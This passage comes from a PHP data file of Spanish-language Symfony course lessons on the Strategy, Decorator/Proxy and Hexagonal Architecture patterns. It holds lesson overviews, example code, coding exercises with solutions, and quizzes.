                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Pricing\\Strategy;\n\nuse InvalidArgumentException;\n\ninterface DiscountStrategyInterface\n{\n    public function getIdentifier(): string;\n    public function apply(float \$amount, float \$rate): float;\n}\n\nclass DiscountStrategyResolver\n{\n    /**\n     * @var array<string, DiscountStrategyInterface>\n     */\n    private array \$strategies = [];\n\n    public function registerStrategy(DiscountStrategyInterface \$strategy): void\n    {\n        // TODO: Validar que getIdentifier() no sea vacío ni esté repetido (InvalidArgumentException)\n        // TODO: Registrar en el array \$this->strategies indexado por su identificador\n    }\n\n    public function resolve(string \$identifier): DiscountStrategyInterface\n    {\n        // TODO: Retornar estrategia o lanzar InvalidArgumentException si no está registrada\n        throw new InvalidArgumentException('Estrategia no encontrada');\n    }\n\n    public function execute(string \$identifier, float \$amount, float \$rate): float\n    {\n        // TODO: Validar que \$amount >= 0.0 y \$rate >= 0.0 (lanzar InvalidArgumentException)\n        // TODO: Resolver la estrategia y ejecutar apply(\$amount, \$rate)\n        return 0.0;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Pricing\\Strategy;\n\nuse InvalidArgumentException;\n\ninterface DiscountStrategyInterface\n{\n    public function getIdentifier(): string;\n    public function apply(float \$amount, float \$rate): float;\n}\n\nclass DiscountStrategyResolver\n{\n    /**\n     * @var array<string, DiscountStrategyInterface>\n     */\n    private array \$strategies = [];\n\n    public function registerStrategy(DiscountStrategyInterface \$strategy): void\n    {\n        \$id = trim(\$strategy->getIdentifier());\n        if (\$id === '') {\n            throw new InvalidArgumentException('El identificador de la estrategia no puede estar vacío.');\n        }\n\n        if (isset(\$this->strategies[\$id])) {\n            throw new InvalidArgumentException(sprintf('La estrategia \"%s\" ya se encuentra registrada.', \$id));\n        }\n\n        \$this->strategies[\$id] = \$strategy;\n    }\n\n    public function resolve(string \$identifier): DiscountStrategyInterface\n    {\n        if (!isset(\$this->strategies[\$identifier])) {\n            throw new InvalidArgumentException(sprintf('No se encontró una estrategia registrada para \"%s\".', \$identifier));\n        }\n\n        return \$this->strategies[\$identifier];\n    }\n\n    public function execute(string \$identifier, float \$amount, float \$rate): float\n    {\n        if (\$amount < 0.0) {\n            throw new InvalidArgumentException('El importe base no puede ser negativo.');\n        }\n\n        if (\$rate < 0.0) {\n            throw new InvalidArgumentException('El valor de descuento no puede ser negativo.');\n        }\n\n        \$strategy = \$this->resolve(\$identifier);\n\n        return \$strategy->apply(\$amount, \$rate);\n    }\n}\n",
                    'explanation' => 'El patrón Strategy combinado con un Resolver central desacopla completamente el punto de invocación de las implementaciones concretas. El registro ordenado con control de duplicados y validación de invariantes en frontera garantiza robustez sin comprometer el principio Open/Closed.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Patrón Strategy & Service Locator en Symfony',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es la diferencia fundamental de rendimiento y memoria entre `#[TaggedIterator]` y `#[AutowireLocator]` en Symfony?',
                            'options' => [
                                'a' => 'TaggedIterator solo funciona con arrays asociativos y AutowireLocator con objetos DateTime.',
                                'b' => 'TaggedIterator instancia todas las estrategias etiquetadas tan pronto como se itera sobre la colección; AutowireLocator genera un contenedor perezoso (Lazy) que solo instancia la estrategia concreta solicitada en tiempo de ejecución.',
                                'c' => 'TaggedIterator no es compatible con PHP 8.4.',
                                'd' => 'AutowireLocator duplica el consumo de CPU al compilar el contenedor.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Cuando existen decenas de estrategias con dependencias complejas (clientes HTTP, conexiones a bases de datos), instanciarlas todas con TaggedIterator degrada la memoria. AutowireLocator proporciona instanciación perezosa (lazy) bajo demanda O(1).',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Qué principio de diseño SOLID se preserva directamente al implementar el patrón Strategy mediante tagged services en lugar de condicionales switch-case?',
                            'options' => [
                                'a' => 'Single Responsibility Principle únicamente.',
                                'b' => 'Open/Closed Principle (OCP), porque el sistema está abierto a la extensión (agregar nuevas estrategias) pero cerrado a la modificación (no se edita el resolver ni las clases existentes).',
                                'c' => 'Liskov Substitution Principle exclusivamente.',
                                'd' => 'Interface Segregation Principle sin relación con la extensibilidad.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Al usar Strategy con autoconfiguración de etiquetas, incorporar un nuevo algoritmo de cálculo o pasarela requiere únicamente crear una clase nueva que implemente la interfaz. El código cliente no sufre ninguna modificación.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Por qué un desarrollador Senior utiliza Backed Enums de PHP 8.4 como identificadores de estrategias en lugar de cadenas de texto arbitrarias (strings)?',
                            'options' => [
                                'a' => 'Porque los Enums eliminan por completo la necesidad de escribir pruebas unitarias.',
                                'b' => 'Porque garantizan exhaustividad y seguridad de tipos en tiempo de estática, evitando errores de tipeo y permitiendo comprobaciones completas en tiempo de compilación.',
                                'c' => 'Porque los strings están deprecados en Symfony 8.',
                                'd' => 'Porque los Enums no ocupan memoria RAM en el Zend Engine.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Los Backed Enums actúan como un conjunto cerrado y tipado de constantes reconocidas por herramientas de análisis estático (PHPStan/Psalm) y el propio lenguaje, erradicando strings mágicos propensos a errores silenciosos.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 9: LECCIÓN 2: Decorator & Proxy en Servicios Enterprise
            // ==========================================
            'patterns-decorator-proxy' => [
                'slug' => 'patterns-decorator-proxy',
                'title' => 'Decorator & Proxy en Servicios Enterprise',
                'module' => 'Patrones de Diseño',
                'minutes' => 50,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'Los patrones estructurales Decorator y Proxy permiten enriquecer el comportamiento y controlar el acceso a los objetos sin alterar su código fuente ni romper sus contratos de interfaz. En Symfony, el atributo nativo #[AsDecorator] transforma la arquitectura de servicios permitiendo inyectar aspectos transversales (Cross-Cutting Concerns) como almacenamiento en caché distribuido, auditoría, métricas de observabilidad o reintentos con Circuit Breaker sin contaminar la lógica de negocio pura. Por su parte, el patrón Proxy (como los proxies de entidades en Doctrine o los Lazy Ghost Objects de PHP 8.4) retrasa la inicialización costosa de objetos hasta el instante preciso en que sus propiedades son accedidas.',
                    'problem' => 'El antipatrón de "Servicios de Dominio Contaminados": una clase de cálculo contable o reporte fiscal que inyecta directamente CacheInterface, LoggerInterface y métricas de Prometheus, llenando sus métodos de llamadas a microtime(true), if (!cache->has()) y bloques try-catch de red. Esto destruye el Single Responsibility Principle (SRP), acopla el dominio a la infraestructura y hace que testear la lógica contable requiera mockear 5 servicios ajenos al negocio.',
                    'solution' => 'Separar responsabilidades mediante Decorators: el servicio de dominio solo implementa la interfaz de negocio (ReportGeneratorInterface) con lógica pura. Se crea un CachedReportGeneratorDecorator decorado con #[AsDecorator] e inyectando #[AutowireDecorated]. El decorador intercepta la llamada, consulta el caché, delega en el servicio interno solo si hay un cache miss, y retorna el resultado. El cliente inyecta la interfaz y permanece 100% ajeno al mecanismo de caché.',
                    'problem_label' => 'El Antipatrón de Mezclar Negocio Puro con Caché, Métricas y Reintentos:',
                    'solution_label' => 'La Solución: Decoradores No Invasivos con #[AsDecorator] y Proxies Virtuales:',
                ],
                'internals' => [
                    'title' => 'Decoración en el Contenedor de Symfony y Lazy Proxies en PHP 8.4',
                    'steps' => [
                        [
                            'phase' => '1. Sustitución en el DIC con #[AsDecorator]',
                            'description' => 'Symfony reemplaza la definición del servicio original en el contenedor por el decorador, inyectando la instancia original interna mediante el atributo #[AutowireDecorated], asegurando total transparencia para los consumidores.',
                        ],
                        [
                            'phase' => '2. Decorator Chaining y Prioridades',
                            'description' => 'Mediante el parámetro priority (ej. priority: 20 vs priority: 10), es posible encadenar múltiples decoradores: LoggingDecorator envuelve a CachedDecorator que envuelve al servicio base.',
                        ],
                        [
                            'phase' => '3. Diferencia Ontológica: Decorator vs Proxy',
                            'description' => 'El Decorator añade comportamiento o responsabilidades adicionales conservando la misma interfaz; el Proxy controla el acceso al objeto real (Lazy Loading, permisos, proxies remotos) sin añadir lógica funcional nueva.',
                        ],
                        [
                            'phase' => '4. Lazy Ghost Objects en PHP 8.4 (ReflectionClass::newLazyGhost)',
                            'description' => 'PHP 8.4 y Doctrine 3 utilizan Lazy Ghost Objects nativos: instancias virtuales cuyos atributos permanecen sin poblar hasta que una propiedad es leída, momento en el cual se ejecuta el callback de inicialización diferida.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Report/CachedReportGeneratorDecorator.php',
                    'title' => 'Decorador de Caché Transparente con Symfony #[AsDecorator] y CacheInterface',
                    'tag' => 'Decorator Pattern & #[AsDecorator]',
                    'code' => "declare(strict_types=1);

namespace App\Report;

use Symfony\Component\DependencyInjection\Attribute\AsDecorator;
use Symfony\Component\DependencyInjection\Attribute\AutowireDecorated;
use Symfony\Contracts\Cache\ItemInterface;
use Symfony\Contracts\Cache\TagAwareCacheInterface;

#[AsDecorator(decorates: ReportGeneratorInterface::class, priority: 10)]
class CachedReportGeneratorDecorator implements ReportGeneratorInterface
{
    public function __construct(
        #[AutowireDecorated]
        private readonly ReportGeneratorInterface \$inner,
        private readonly TagAwareCacheInterface \$cache
    ) {}

    public function generateMonthlyReport(int \$year, int \$month): FinancialReport
    {
        \$cacheKey = sprintf('financial_report_%d_%02d', \$year, \$month);

        return \$this->cache->get(\$cacheKey, function (ItemInterface \$item) use (\$year, \$month): FinancialReport {
            \$item->expiresAfter(3600); // 1 hora de TTL
            \$item->tag(['reports', sprintf('report_year_%d', \$year)]);

            // Delegación transparente al servicio interno no contaminado
            return \$this->inner->generateMonthlyReport(\$year, \$month);
        });
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior protege celosamente la pureza del núcleo de dominio. Considera que requerimientos no funcionales como caching, logging de auditoría, reintentos o recolección de telemetría son aspectos transversales que deben resolverse con Decorators en lugar de incrustarse en los métodos de negocio. Además, comprende los trade-offs de los Lazy Proxies en el ORM para evitar fallos de inicialización fuera de la sesión.',
                    'critical_questions' => [
                        '¿Por qué nuestro servicio contable está inyectando CacheInterface y LoggerInterface si su única responsabilidad es calcular balances?',
                        '¿Cómo afecta el orden de prioridad en una cadena de decoradores (ej. debe el Circuit Breaker estar por encima o por debajo del Cache Decorator)?',
                        '¿Qué diferencia existe entre un Virtual Proxy de Doctrine y un Ghost Object de PHP 8.4 en términos de consumo de memoria?',
                        '¿Nuestros tests unitarios de negocio pueden ejecutarse sin levantar Redis gracias al desacoplamiento mediante Decorators?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Incorporar almacenamiento en caché distribuido y auditoría de tiempos a un generador de balances fiscales complejos.',
                    'junior' => [
                        'approach' => 'Modifica directamente el servicio de negocio inyectando CacheInterface, envolviendo el cálculo en bloques if (!cache->get()) y registrando logs manualmente.',
                        'flaws' => [
                            'Violación de SRP: mezcla cálculo contable con almacenamiento en caché e infraestructura física de Redis.',
                            'Tests unitarios arruinados: ahora requieren mockear CacheInterface y CacheItemInterface para probar sumas contables.',
                            'Imposible reutilizar el cálculo puro en contextos donde no se desea caché (ej. comandos de reconciliación nocturna).',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Mantiene el servicio contable 100% puro e ignorante del caché. Crea un CachedReportGeneratorDecorator con #[AsDecorator] que envuelve al original de forma transparente.',
                        'rationale' => [
                            'Dominio inmaculado: el cálculo contable se prueba con tests unitarios en 2 milisegundos sin dependencias externas.',
                            'Transparencia total: los controladores o listeners continúan inyectando ReportGeneratorInterface sin enterarse del cambio.',
                            'Flexibilidad operativa: el decorador puede activarse, desactivarse o reordenarse mediante configuración del contenedor.',
                        ],
                        'trade_offs' => 'Añade una capa de indirección que requiere comprender la resolución de dependencias decoradas de Symfony.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Decorador de Resiliencia con Reintentos Exponenciales (RetryDecorator)',
                    'objective' => 'Implementar RetryableGatewayDecorator que decore PaymentGatewayInterface aplicando el patrón Decorator: si el gateway interno lanza TransientGatewayException, reintenta la operación hasta un máximo de intentos configurado, capturando el fallo y validando que maxRetries sea al menos 1.',
                    'instructions' => 'Completa RetryableGatewayDecorator: valida en el constructor que maxRetries sea mayor o igual a 1 (lanzando InvalidArgumentException). En charge, ejecuta la llamada delegando a $this->inner->charge. Si se captura una TransientGatewayException, reintenta la llamada hasta completar maxRetries intentos; si se agotan todos los reintentos, propaga la excepción capturada.',
                    'filename' => 'RetryableGatewayDecorator.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Payment\\Decorator;\n\nuse RuntimeException;\nuse InvalidArgumentException;\n\nclass TransientGatewayException extends RuntimeException {}\n\ninterface PaymentGatewayInterface\n{\n    public function charge(int \$amountInCents, string \$currency): string;\n}\n\nclass RetryableGatewayDecorator implements PaymentGatewayInterface\n{\n    public function __construct(\n        private readonly PaymentGatewayInterface \$inner,\n        private readonly int \$maxRetries = 3\n    ) {\n        // TODO: Validar que \$this->maxRetries >= 1 o lanzar InvalidArgumentException\n    }\n\n    public function charge(int \$amountInCents, string \$currency): string\n    {\n        // TODO: Delegar en \$this->inner->charge(\$amountInCents, \$currency)\n        // TODO: Capturar TransientGatewayException y reintentar hasta \$this->maxRetries veces\n        // TODO: Si todos los reintentos fallan, propagar la última excepción capturada\n        return '';\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Payment\\Decorator;\n\nuse RuntimeException;\nuse InvalidArgumentException;\n\nclass TransientGatewayException extends RuntimeException {}\n\ninterface PaymentGatewayInterface\n{\n    public function charge(int \$amountInCents, string \$currency): string;\n}\n\nclass RetryableGatewayDecorator implements PaymentGatewayInterface\n{\n    public function __construct(\n        private readonly PaymentGatewayInterface \$inner,\n        private readonly int \$maxRetries = 3\n    ) {\n        if (\$this->maxRetries < 1) {\n            throw new InvalidArgumentException('El número máximo de reintentos debe ser al menos 1.');\n        }\n    }\n\n    public function charge(int \$amountInCents, string \$currency): string\n    {\n        \$attempts = 0;\n        \$lastException = null;\n\n        while (\$attempts < \$this->maxRetries) {\n            \$attempts++;\n            try {\n                return \$this->inner->charge(\$amountInCents, \$currency);\n            } catch (TransientGatewayException \$e) {\n                \$lastException = \$e;\n                if (\$attempts >= \$this->maxRetries) {\n                    throw \$e;\n                }\n            }\n        }\n\n        throw (\$lastException ?? new RuntimeException('Error inesperado en reintentos.'));\n    }\n}\n",
                    'explanation' => 'El patrón Decorator permite dotar de resiliencia y tolerancia a fallos transitorios a cualquier cliente de infraestructura sin alterar su implementación ni forzar al código cliente a implementar bucles de reintento manuales. La interfaz permanece inalterada y la responsabilidad se mantiene aislada.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Patrones Decorator & Proxy en Symfony Enterprise',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es la función del atributo `#[AutowireDecorated]` al implementar un Decorator en Symfony?',
                            'options' => [
                                'a' => 'Convierte la clase en un comando de consola de Symfony.',
                                'b' => 'Inyecta automáticamente la instancia del servicio original interno que está siendo decorado, permitiendo que el decorador delegue la llamada al servicio real tras ejecutar su lógica interceptora.',
                                'c' => 'Indica a Doctrine que debe crear una migración de base de datos.',
                                'd' => 'Desactiva el recolector de basura de PHP para el servicio decorado.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Symfony sustituye la definición del servicio original en el DIC por el decorador. Mediante #[AutowireDecorated], Symfony provee la referencia al servicio original interno para posibilitar la delegación.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cuál es la diferencia conceptual primordial entre el patrón Decorator y el patrón Proxy?',
                            'options' => [
                                'a' => 'El Decorator añade responsabilidades y comportamientos adicionales (Cross-Cutting Concerns) a un objeto manteniendo su interfaz; el Proxy controla el acceso al objeto (Lazy Loading, seguridad, acceso remoto) sin añadir comportamiento de negocio nuevo.',
                                'b' => 'El Decorator solo funciona con bases de datos relacionales y el Proxy con Redis.',
                                'c' => 'Un Proxy no puede implementar interfaces en PHP 8.4.',
                                'd' => 'Son sinónimos idénticos y no existe diferencia de intención ni arquitectura.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'La diferencia reside en la intención: el Decorator enriquece el qué hace el objeto (ej. caching, reintentos, métricas); el Proxy controla el cómo y cuándo se accede al objeto (ej. retrasar su carga hasta que sea necesaria).',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué ventaja introducen los Lazy Ghost Objects (`ReflectionClass::newLazyGhost`) en PHP 8.4 y Symfony frente a los proxies tradicionales por herencia?',
                            'options' => [
                                'a' => 'Permiten inicializar instancias en el mismo espacio de memoria de la clase sin generar subclases proxy complejas en disco, reduciendo drásticamente el consumo de memoria y eliminando problemas de identidad de tipos (instanceof).',
                                'b' => 'Permiten conectarse a MySQL sin necesidad de contraseña.',
                                'c' => 'Hacen que las peticiones HTTP no requieran servidor web.',
                                'd' => 'Eliminan la necesidad de usar return en las funciones.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Los Lazy Ghost Objects nativos de PHP 8.4 son instancias reales de la clase original cuya inicialización de propiedades se difiere a un closure interno. Esto elimina la generación de clases proxy hijas en disco y garantiza que el operador instanceof y la identidad de objeto sean perfectos.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 10: LECCIÓN 1: Arquitectura Hexagonal: Cuándo Sí y Cuándo No
            // ==========================================
            'arch-hexagonal-clean' => [
                'slug' => 'arch-hexagonal-clean',
                'title' => 'Arquitectura Hexagonal: Cuándo Sí y Cuándo No',
                'module' => 'Arquitectura de Software',
                'minutes' => 60,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'La Arquitectura Hexagonal (Puertos y Adaptadores, ideada por Alistair Cockburn) desacopla radicalmente las reglas de negocio y los casos de uso centrales de las tecnologías periféricas de entrada y salida (HTTP Controllers, CLI, Doctrine ORM, colas RabbitMQ, pasarelas de pago externas). La Inversión de Dependencias (DIP) rige la frontera: el Dominio declara Puertos (interfaces de entrada y salida), y la Infraestructura provee Adaptadores concretos. Esto hace que la lógica de negocio sea 100% testeable en memoria sin necesidad de levantar bases de datos ni arrancar frameworks.',
                    'problem' => 'El falso dilema del desarrollo: caer en el "Overengineering Burocrático" (crear 6 capas, 4 DTOs y 3 mappers para un CRUD simple de 2 campos) o en el "Monolito Acoplado" (mezclar consultas Doctrine SQL crudas y llamadas directas a APIs de terceros dentro de controladores de Symfony). El primero arruina la velocidad de entrega del equipo; el segundo destruye la mantenibilidad y hace imposible testear el negocio de forma aislada.',
                    'solution' => 'Marco de decisión Senior pragmático: adoptar Hexagonal cuando la complejidad de dominio supera la complejidad de almacenamiento, o cuando existen múltiples puntos de entrada (HTTP API, consumidores de mensajería asíncrona, comandos CLI) que consumen el mismo caso de uso. En la frontera, usar Command DTOs inmutables para la entrada y Puertos conducidos (driven ports) para persistencia y notificaciones.',
                    'problem_label' => 'El Antipatrón del Overengineering Burocrático vs el Monolito Acoplado:',
                    'solution_label' => 'La Solución: Puertos, Adaptadores y Evaluación Pragmática de Trade-offs:',
                ],
                'internals' => [
                    'title' => 'Fronteras Arquitectónicas, Puertos y Regla de Dependencia',
                    'steps' => [
                        [
                            'phase' => '1. Puertos Primarios (Driving Ports) vs Secundarios (Driven Ports)',
                            'description' => 'Los primarios definen la API de la aplicación que los adaptadores de entrada (Controllers, CLI) invocan (Casos de Uso / Command Handlers). Los secundarios definen las interfaces que el caso de uso requiere de la infraestructura exterior (Repositorios, Pasarelas de Pago).',
                        ],
                        [
                            'phase' => '2. Regla de Dependencia Estricta (Hacia Adentro)',
                            'description' => 'src/Domain no importa ningún namespace de Symfony, Doctrine o librerías HTTP. src/Application solo conoce a src/Domain. src/Infrastructure implementa los puertos de dominio y aplicación, conociendo los frameworks externos.',
                        ],
                        [
                            'phase' => '3. DTOs Inmutables y Mappers en los Bordes',
                            'description' => 'Los adaptadores primarios deserializan el payload HTTP en Commands inmutables con tipado estricto. El caso de uso jamás recibe Request de Symfony ni expone entidades Doctrine mutables hacia la capa web.',
                        ],
                        [
                            'phase' => '4. Heurística Senior: Cuándo NO usar Hexagonal',
                            'description' => 'En CRUDs básicos, paneles de administración internos o prototipos de validación rápida, la arquitectura clásica de 3 capas de Symfony aporta 5 veces más agilidad con una fracción de la complejidad cognitiva.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Order/Application/CreateOrderUseCase.php',
                    'title' => 'Caso de Uso Hexagonal Puro con Puertos de Entrada y Salida en PHP 8.4',
                    'tag' => 'Hexagonal Architecture & Ports/Adapters',
                    'code' => "declare(strict_types=1);

namespace App\Order\Application;

use App\Order\Domain\Model\Order;
use App\Order\Domain\Model\OrderId;
use App\Order\Domain\Port\OrderRepositoryInterface;
use App\Order\Domain\Port\PaymentGatewayInterface;

// Puerto Primario (Caso de Uso de Aplicación)
readonly class CreateOrderUseCase
{
    public function __construct(
        // Puertos Secundarios (Driven Ports inyectados por DIP)
        private OrderRepositoryInterface \$orderRepository,
        private PaymentGatewayInterface \$paymentGateway
    ) {}

    public function execute(CreateOrderCommand \$command): CreateOrderResponse
    {
        // 1. Dominio puro: La entidad Order protege sus invariantes internas
        \$order = Order::create(
            OrderId::fromString(\$command->orderId),
            \$command->customerId,
            \$command->items
        );

        // 2. Persistencia inicial a través del puerto secundario
        \$this->orderRepository->save(\$order);

        // 3. Orquestación de infraestructura externa a través de puerto desacoplado
        \$paymentResult = \$this->paymentGateway->charge(
            \$order->getTotalAmountInCents(),
            \$command->paymentToken
        );

        if (\$paymentResult->isSuccessful()) {
            \$order->markAsPaid(\$paymentResult->transactionId);
            \$this->orderRepository->save(\$order);
        }

        return new CreateOrderResponse(
            \$order->getId()->value,
            \$order->getStatus()->value,
            \$order->getTotalAmountInCents()
        );
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior concibe la arquitectura de software no como un conjunto de dogmas o fetiches estéticos, sino como una inversión económica en mitigación de riesgos. Pregunta siempre: ¿Cuál es el costo de cambio de esta decisión? Aplica Arquitectura Hexagonal cuando el modelo de negocio es complejo y cambiante, y rechaza el overengineering en módulos auxiliares o CRUDs directos donde Symfony estándar ofrece la máxima eficiencia operativa.',
                    'critical_questions' => [
                        '¿Este módulo tiene suficiente complejidad de reglas de negocio para justificar la separación de capas y mappers?',
                        '¿Nuestras entidades de dominio están libres de anotaciones de Doctrine o acoplamientos al framework web?',
                        '¿Podemos ejecutar una suite completa de pruebas unitarias sobre los casos de uso en menos de 100 milisegundos sin arrancar MySQL ni Symfony?',
                        '¿Estamos creando puertos e interfaces superfluas para servicios de los que solo existirá una única implementación para siempre?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Procesar la creación y cobro de un pedido tanto desde la API web como desde un comando de importación masiva por consola CLI.',
                    'junior' => [
                        'approach' => 'Duplica la lógica de negocio copiando y pegando 80 líneas de código con EntityManager y StripeClient tanto en OrderApiController como en ImportOrdersCommand.',
                        'flaws' => [
                            'Duplicación de reglas de negocio: cualquier cambio en impuestos o validaciones debe sincronizarse manualmente en dos lugares.',
                            'Acoplamiento fatal a la petición HTTP: el comando CLI tiene que fabricar Requests falsas para reutilizar código.',
                            'Imposible de testear sin una base de datos real levantada y conexión a Stripe.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Encapsula la creación del pedido en CreateOrderUseCase (puerto primario). El Controller web y el Command CLI son simples adaptadores primarios que parsean su entrada y delegan en el mismo caso de uso puro.',
                        'rationale' => [
                            '100% de reutilización del caso de uso entre HTTP, CLI y consumidores de colas.',
                            'Dominio protegido contra cambios de infraestructura (migrar de Stripe a Adyen solo requiere crear un nuevo adaptador secundario).',
                            'Pruebas unitarias ultrarrápidas inyectando repositorios en memoria (InMemoryOrderRepository).',
                        ],
                        'trade_offs' => 'Requiere diseñar DTOs de comando e interfaces de puerto adicionales.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Implementación de un Caso de Uso Desacoplado con Puertos (RegisterUserUseCase)',
                    'objective' => 'Implementar RegisterUserUseCase en la capa de Aplicación que valide invariantes en frontera (formato de correo con filter_var, contraseña mínima de 8 caracteres), verifique unicidad con el puerto UserRepositoryInterface (lanzando UserAlreadyExistsException), cree la entidad User con password_hash y la guarde a través del puerto secundario.',
                    'instructions' => 'Completa RegisterUserUseCase: valida que email sea válido usando filter_var con FILTER_VALIDATE_EMAIL (de lo contrario lanza InvalidArgumentException). Valida que plainPassword tenga al menos 8 caracteres (lanzando InvalidArgumentException). Consulta userRepository->findByEmail; si el usuario ya existe, lanza UserAlreadyExistsException. Finalmente, genera el hash seguro con password_hash($plainPassword, PASSWORD_BCRYPT), crea la instancia User, invoca userRepository->save($user) y retorna la entidad creada.',
                    'filename' => 'RegisterUserUseCase.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\User\\Application;\n\nuse InvalidArgumentException;\nuse RuntimeException;\n\nclass UserAlreadyExistsException extends RuntimeException {}\n\nclass User\n{\n    public function __construct(\n        private readonly string \$id,\n        private readonly string \$email,\n        private readonly string \$passwordHash\n    ) {}\n\n    public function getId(): string { return \$this->id; }\n    public function getEmail(): string { return \$this->email; }\n    public function getPasswordHash(): string { return \$this->passwordHash; }\n}\n\ninterface UserRepositoryInterface\n{\n    public function findByEmail(string \$email): ?User;\n    public function save(User \$user): void;\n}\n\nclass RegisterUserUseCase\n{\n    public function __construct(\n        private readonly UserRepositoryInterface \$userRepository\n    ) {}\n\n    public function execute(string \$id, string \$email, string \$plainPassword): User\n    {\n        // TODO: Validar email con filter_var y FILTER_VALIDATE_EMAIL (InvalidArgumentException)\n        // TODO: Validar que strlen(\$plainPassword) >= 8 (InvalidArgumentException)\n        // TODO: Comprobar existencia con \$this->userRepository->findByEmail (UserAlreadyExistsException)\n        // TODO: Generar hash con password_hash, crear User y guardar con \$this->userRepository->save\n        // TODO: Retornar la entidad User persistida\n        throw new RuntimeException('No implementado');\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\User\\Application;\n\nuse InvalidArgumentException;\nuse RuntimeException;\n\nclass UserAlreadyExistsException extends RuntimeException {}\n\nclass User\n{\n    public function __construct(\n        private readonly string \$id,\n        private readonly string \$email,\n        private readonly string \$passwordHash\n    ) {}\n\n    public function getId(): string { return \$this->id; }\n    public function getEmail(): string { return \$this->email; }\n    public function getPasswordHash(): string { return \$this->passwordHash; }\n}\n\ninterface UserRepositoryInterface\n{\n    public function findByEmail(string \$email): ?User;\n    public function save(User \$user): void;\n}\n\nclass RegisterUserUseCase\n{\n    public function __construct(\n        private readonly UserRepositoryInterface \$userRepository\n    ) {}\n\n    public function execute(string \$id, string \$email, string \$plainPassword): User\n    {\n        if (!filter_var(\$email, FILTER_VALIDATE_EMAIL)) {\n            throw new InvalidArgumentException('El formato del correo electrónico no es válido.');\n        }\n\n        if (strlen(\$plainPassword) < 8) {\n            throw new InvalidArgumentException('La contraseña debe contener al menos 8 caracteres.');\n        }\n\n        if (\$this->userRepository->findByEmail(\$email) !== null) {\n            throw new UserAlreadyExistsException(sprintf('El usuario con email \"%s\" ya se encuentra registrado.', \$email));\n        }\n\n        \$hash = password_hash(\$plainPassword, PASSWORD_BCRYPT);\n        \$user = new User(\$id, \$email, \$hash);\n\n        \$this->userRepository->save(\$user);\n\n        return \$user;\n    }\n}\n",
                    'explanation' => 'En la Arquitectura Hexagonal, el Caso de Uso orquesta el flujo de negocio dependiendo exclusivamente de abstracciones (puertos). El uso de validaciones de guardia tempranas y excepciones de dominio evita que datos inválidos penetren en el modelo, permitiendo que la lógica se pruebe con un repositorio en memoria sin necesidad de MySQL.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Arquitectura Hexagonal y Puertos/Adaptadores',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es la diferencia conceptual entre un Puerto Primario (Driving Port) y un Puerto Secundario (Driven Port) en Arquitectura Hexagonal?',
                            'options' => [
                                'a' => 'Los primarios solo se programan en PHP y los secundarios en JavaScript.',
                                'b' => 'Los primarios son las interfaces de casos de uso invocadas por adaptadores de entrada (Controllers HTTP, CLI); los secundarios son interfaces requeridas por el dominio para interactuar con infraestructura externa (Repositorios, Mailers, Pasarelas).',
                                'c' => 'Los primarios requieren conexión a MySQL y los secundarios a Redis.',
                                'd' => 'Son idénticos y se pueden intercambiar sin reglas.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Los Puertos Primarios (o de entrada) exponen la API de la aplicación que el exterior consume. Los Puertos Secundarios (o de salida) son abstracciones que el caso de uso necesita para delegar efectos secundarios en adaptadores de infraestructura.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cuál es la regla de dependencia fundamental en Arquitectura Limpia y Hexagonal?',
                            'options' => [
                                'a' => 'Las dependencias siempre apuntan hacia adentro: el Dominio es el núcleo y no conoce a la Aplicación ni a la Infraestructura; la Infraestructura depende de las abstracciones del Dominio.',
                                'b' => 'El Dominio debe depender directamente de las clases finales de Doctrine ORM para optimizar consultas.',
                                'c' => 'Los controladores HTTP deben instanciar directamente las entidades de base de datos.',
                                'd' => 'Todas las capas deben depender directamente del Symfony Kernel.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'La Inversión de Dependencias (DIP) exige que las flechas de dependencia apunten hacia el centro. El Dominio y la Aplicación son agnósticos a los frameworks y bases de datos concretas.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Bajo qué circunstancias un desarrollador Senior desaconseja el uso de Arquitectura Hexagonal?',
                            'options' => [
                                'a' => 'Cuando la aplicación maneja dinero.',
